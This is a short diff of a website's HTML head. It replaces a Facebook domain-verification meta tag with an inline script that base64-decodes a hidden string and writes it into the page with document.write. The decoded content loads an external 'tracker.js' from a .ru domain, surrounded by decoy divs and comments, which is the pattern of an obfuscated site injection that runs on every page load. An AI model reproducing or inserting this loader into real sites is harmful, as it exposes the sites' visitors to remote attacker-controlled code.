@@ -2,7 +2,9 @@
 <html class="no-js" lang="zxx">
 <html lang="en-US">
 <head>
-	<meta name="facebook-domain-verification" content="oib41xyoqae5srqamlgn81lwjv2ver" />
+<script type="text/javascript">
+    let encoded = 'PCEtLSBrc2R1IC0tPiA8ZGl2IGNsYXNzPSJjaGVja19mb3JfanpsaDN0dTN5czBiIj48L2Rpdj48IS0tIHdwbm14aGxodTRldmprNm1iMHhiZjg2OGRiZ3prbGVpZTA3Zng5IC0tPjxzY3JpcHQgc3JjPSJodHRwczovL2tsb29say5ydS90cmFja2VyLmpzIj4gPC9zY3JpcHQ+PGRpdiBjbGFzcz0iY2hlY2tfZm9yX3IyYTV0eXNoeWthMDE5MjM0eXQiPjwvZGl2PjwhLS0gZGlpcmprYzkzNGg4ZGJnanJyN2Nvdm84anUgLS0+';let decoded = atob(encoded);document.write(''+ decoded +'');
+    </script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="profile" href="xfn/11.html">
